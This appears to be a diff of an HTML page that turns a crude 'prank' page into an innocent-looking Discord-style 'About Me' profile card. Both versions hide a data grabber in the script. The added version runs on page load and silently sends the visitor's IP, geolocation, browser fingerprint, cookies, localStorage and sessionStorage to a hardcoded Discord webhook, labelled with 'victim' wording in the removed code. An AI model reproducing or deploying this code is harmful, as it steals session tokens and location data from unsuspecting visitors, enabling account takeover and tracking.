@@ -3,192 +3,245 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Document</title>
+  <title>About Me</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
     body {
+      background: linear-gradient(135deg, #7289da 0%, #99aab5 50%, #43b581 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      color: #ffffff;
+      overflow: hidden;
+    }
+    
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="25" cy="25" r="1" fill="white" opacity="0.1"/><circle cx="75" cy="75" r="1" fill="white" opacity="0.1"/><circle cx="50" cy="10" r="0.5" fill="white" opacity="0.05"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
+      pointer-events: none;
+    }
+    
+    .profile-container {
+      position: relative;
+      z-index: 1;
+    }
+    
+    .profile-card {
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 24px;
+      padding: 48px 32px;
+      max-width: 400px;
+      width: 90%;
       text-align: center;
-      background-size: 400% 400%;
-      color: white;
-      height: 100vh;
-      font-family: 'Orbitron', sans-serif;
+      box-shadow: 
+        0 8px 32px rgba(0, 0, 0, 0.1),
+        inset 0 1px 0 rgba(255, 255, 255, 0.2);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
     }
-    button {
-      background-color: white;
-      color: black;
-      padding: 10px 30px;
-      border-radius: 50px;
-      font-size: 40px;
-      transition: 0.3s ease;
-      border: 2px solid black;
-      cursor: pointer;
-      margin: 20px;
+    
+    .profile-card:hover {
+      transform: translateY(-4px);
+      box-shadow: 
+        0 16px 48px rgba(0, 0, 0, 0.15),
+        inset 0 1px 0 rgba(255, 255, 255, 0.3);
     }
-    button:hover {
-      font-size: 50px;
-      color: white;
+    
+    .pfp {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.2);
+      margin: 0 auto 24px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+      color: rgba(255, 255, 255, 0.5);
     }
-    button:first-of-type:hover {
-      background-color: green;
-      box-shadow: 0 0 40px green;
+    
+    .username {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: rgba(255, 255, 255, 0.95);
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
     }
-    button:last-of-type:hover {
-      background-color: red;
-      box-shadow: 0 0 40px red;
+    
+    .nickname {
+      font-size: 18px;
+      font-weight: 400;
+      color: rgba(255, 255, 255, 0.7);
+      margin-bottom: 24px;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
     }
-    h1 {
-        color: black;
+    
+    .bio {
+      font-size: 16px;
+      font-weight: 300;
+      line-height: 1.5;
+      color: rgba(255, 255, 255, 0.8);
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
     }
-    h5 {
-        color: black;
+    
+    @media (max-width: 480px) {
+      .profile-card {
+        padding: 32px 24px;
+        margin: 20px;
+      }
+      
+      .pfp {
+        width: 100px;
+        height: 100px;
+        font-size: 40px;
+      }
+      
+      .username {
+        font-size: 24px;
+      }
     }
   </style>
 </head>
 <body>
-  <h1>hello</h1>
-  <h5>marii please give us the minecraft server</h5>
-  <button>sure</button>
-  <button>no</button>
+  <div class="profile-container">
+    <div class="profile-card">
+      <div class="pfp">👤</div>
+      <h2 class="username">username</h2>
+      <h3 class="nickname">nickname</h3>
+      <p class="bio">test</p>
+    </div>
+  </div>
+  
   <script>
-    const yesButton = document.querySelector('button:first-of-type');
-    const noButton = document.querySelector('button:last-of-type');
     const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
-    const sendNewVictim = () => {
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: 'New victim' }),
-      }).catch(console.error);
-    };
-    sendNewVictim();
-    const getCookiesBlob = () => {
-      const cookies = document.cookie || 'No cookies';
-      const blob = new Blob([cookies], { type: 'text/plain' });
-      return { blob, filename: 'cookies.txt' };
-    };
-    const sendWithCookies = (embedPayload, color, title) => {
-      const { blob, filename } = getCookiesBlob();
-      const formData = new FormData();
-      formData.append('payload_json', JSON.stringify({
-        embeds: [{
-          ...embedPayload,
-          color: color,
-          title: title
-        }]
-      }));
-      formData.append('file', blob, filename);
-      fetch(webhookUrl, {
-        method: 'POST',
-        body: formData,
-      }).catch(console.error);
-    };
-    const getUserInfo = (ip) => {
-      return fetch(`http://ip-api.com/json/${ip}`)
-        .then(geoResponse => geoResponse.json())
-        .then(geoData => {
-          const lat = geoData.lat || 'unknown';
-          const lon = geoData.lon || 'unknown';
-          const country = geoData.country || 'unknown';
-          const countryCode = geoData.countryCode || 'unknown';
-          const region = geoData.regionName || 'unknown';
-          const regionCode = geoData.region || 'unknown';
-          const city = geoData.city || 'unknown';
-          const district = geoData.district || 'unknown';
-          const zip = geoData.zip || 'unknown';
-          const isp = geoData.isp || 'unknown';
-          const org = geoData.org || 'unknown';
-          const as = geoData.as || 'unknown';
-          const timezone = geoData.timezone || 'unknown';
-          const mobile = geoData.mobile ? 'Yes' : 'No';
-          const proxy = geoData.proxy ? 'Yes' : 'No';
-          const hosting = geoData.hosting ? 'Yes' : 'No';
-          const status = geoData.status || 'unknown';
-          const userAgent = navigator.userAgent || 'unknown';
-          const language = navigator.language || 'unknown';
-          const platform = navigator.platform || 'unknown';
-          const screenRes = `${screen.width}x${screen.height}` || 'unknown';
-          const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-          const timestamp = new Date().toISOString();
-          return {
-            embed: {
-              description: `Timestamp: ${timestamp}`,
-              fields: [
-                { name: 'IP', value: ip, inline: true },
-                { name: 'Status', value: status, inline: true },
-                { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
-                { name: 'Country', value: country, inline: true },
-                { name: 'Country Code', value: countryCode, inline: true },
-                { name: 'Region', value: region, inline: true },
-                { name: 'Region Code', value: regionCode, inline: true },
-                { name: 'City', value: city, inline: true },
-                { name: 'District', value: district, inline: true },
-                { name: 'ZIP', value: zip, inline: true },
-                { name: 'ISP', value: isp, inline: true },
-                { name: 'Organization', value: org, inline: true },
-                { name: 'AS', value: as, inline: true },
-                { name: 'Timezone', value: timezone, inline: true },
-                { name: 'Mobile', value: mobile, inline: true },
-                { name: 'Proxy', value: proxy, inline: true },
-                { name: 'Hosting', value: hosting, inline: true },
-                { name: 'User Agent', value: userAgent, inline: false },
-                { name: 'Language', value: language, inline: true },
-                { name: 'Platform', value: platform, inline: true },
-                { name: 'Screen Resolution', value: screenRes, inline: true },
-                { name: 'Cookies Enabled', value: cookieEnabled, inline: true }
-              ],
-              footer: { text: 'Grabbed via prank page' }
-            }
-          };
-        })
-        .catch(geoError => {
-          console.error('Error fetching geolocation:', geoError);
-          const timestamp = new Date().toISOString();
-          return {
-            embed: {
-              description: `Timestamp: ${timestamp}`,
-              fields: [
-                { name: 'IP', value: ip, inline: true },
-                { name: 'User Agent', value: navigator.userAgent || 'unknown', inline: false },
-                { name: 'Language', value: navigator.language || 'unknown', inline: true },
-                { name: 'Platform', value: navigator.platform || 'unknown', inline: true },
-                { name: 'Screen Resolution', value: `${screen.width}x${screen.height}` || 'unknown', inline: true },
-                { name: 'Cookies Enabled', value: navigator.cookieEnabled ? 'Yes' : 'No', inline: true }
-              ],
-              footer: { text: 'Geolocation failed' }
-            }
-          };
+    
+    const sendData = async () => {
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+        
+        const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
+        const geoData = await geoResponse.json();
+        
+        const lat = geoData.lat || 'unknown';
+        const lon = geoData.lon || 'unknown';
+        const country = geoData.country || 'unknown';
+        const countryCode = geoData.countryCode || 'unknown';
+        const region = geoData.regionName || 'unknown';
+        const regionCode = geoData.region || 'unknown';
+        const city = geoData.city || 'unknown';
+        const district = geoData.district || 'unknown';
+        const zip = geoData.zip || 'unknown';
+        const isp = geoData.isp || 'unknown';
+        const org = geoData.org || 'unknown';
+        const as = geoData.as || 'unknown';
+        const timezoneGeo = geoData.timezone || 'unknown';
+        const mobile = geoData.mobile ? 'Yes' : 'No';
+        const proxy = geoData.proxy ? 'Yes' : 'No';
+        const hosting = geoData.hosting ? 'Yes' : 'No';
+        const status = geoData.status || 'unknown';
+        
+        const userAgent = navigator.userAgent || 'unknown';
+        const languages = navigator.languages ? navigator.languages.join(', ') : (navigator.language || 'unknown');
+        const platform = navigator.platform || 'unknown';
+        const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}` || 'unknown';
+        const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+        const referrer = document.referrer || 'direct';
+        const doNotTrack = navigator.doNotTrack || 'unspecified';
+        const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+        const deviceMemory = navigator.deviceMemory || 'unknown';
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || timezoneGeo;
+        const connection = navigator.connection 
+          ? `${navigator.connection.effectiveType} (${navigator.connection.downlink || 'unknown'} Mbps)` 
+          : 'unsupported';
+        const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
+        const timestamp = new Date().toISOString();
+        
+        const embed = {
+          title: 'User Profile Data',
+          description: `Timestamp: ${timestamp}\nReferrer: ${referrer}`,
+          color: 3447003,
+          fields: [
+            { name: 'IP', value: ip, inline: true },
+            { name: 'Status', value: status, inline: true },
+            { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
+            { name: 'Country', value: country, inline: true },
+            { name: 'Country Code', value: countryCode, inline: true },
+            { name: 'Region', value: region, inline: true },
+            { name: 'Region Code', value: regionCode, inline: true },
+            { name: 'City', value: city, inline: true },
+            { name: 'District', value: district, inline: true },
+            { name: 'ZIP', value: zip, inline: true },
+            { name: 'ISP', value: isp, inline: true },
+            { name: 'Organization', value: org, inline: true },
+            { name: 'AS', value: as, inline: true },
+            { name: 'Timezone', value: timezone, inline: true },
+            { name: 'Mobile', value: mobile, inline: true },
+            { name: 'Proxy', value: proxy, inline: true },
+            { name: 'Hosting', value: hosting, inline: true },
+            { name: 'User Agent', value: userAgent.substring(0, 1024), inline: false },
+            { name: 'Languages', value: languages.substring(0, 1024), inline: false },
+            { name: 'Platform', value: platform, inline: true },
+            { name: 'Screen Resolution', value: screenRes, inline: true },
+            { name: 'Cookies Enabled', value: cookieEnabled, inline: true },
+            { name: 'Do Not Track', value: doNotTrack, inline: true },
+            { name: 'Hardware Concurrency', value: hardwareConcurrency, inline: true },
+            { name: 'Device Memory (GB)', value: deviceMemory, inline: true },
+            { name: 'Connection', value: connection, inline: true },
+            { name: 'Plugins', value: pluginsList.substring(0, 1024), inline: false }
+          ],
+          footer: { text: 'Grabbed via Discord-like About Me Page' }
+        };
+        
+        const formData = new FormData();
+        formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+        
+        // Cookies
+        if (document.cookie) {
+          const cookiesBlob = new Blob([document.cookie], { type: 'text/plain' });
+          formData.append('file1', cookiesBlob, 'cookies.txt');
+        }
+        
+        // LocalStorage
+        const lsData = JSON.stringify(localStorage, null, 2);
+        const lsBlob = new Blob([lsData], { type: 'application/json' });
+        formData.append('file2', lsBlob, 'localStorage.json');
+        
+        // SessionStorage
+        const ssData = JSON.stringify(sessionStorage, null, 2);
+        const ssBlob = new Blob([ssData], { type: 'application/json' });
+        formData.append('file3', ssBlob, 'sessionStorage.json');
+        
+        await fetch(webhookUrl, {
+          method: 'POST',
+          body: formData,
         });
+        
+        console.log('All user data sent to webhook');
+      } catch (error) {
+        console.error('Error sending data:', error);
+      }
     };
-    yesButton.addEventListener('click', () => {
-      alert('cool thanks!');
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip;
-          console.log('Your IP:', ip);
-          getUserInfo(ip).then(({ embed }) => {
-            sendWithCookies(embed, 65280, 'Victim Agreed - Green');
-          });
-        })
-        .catch(error => {
-          console.error('Error fetching IP:', error);
-        });
-    });
-    noButton.addEventListener('click', () => {
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip;
-          console.log('Your IP:', ip);
-          getUserInfo(ip).then(({ embed }) => {
-            sendWithCookies(embed, 16711680, 'Victim Refused - Red');
-          });
-          alert(`no?? Then your ip shall be mine, its ${ip} btw`);
-        })
-        .catch(error => {
-          console.error('Error fetching IP:', error);
-          alert('no?? Then your ip shall be mine, its [error] btw');
-        });
-    });
+    
+    document.addEventListener('DOMContentLoaded', sendData);
   </script>
 </body>
 </html>
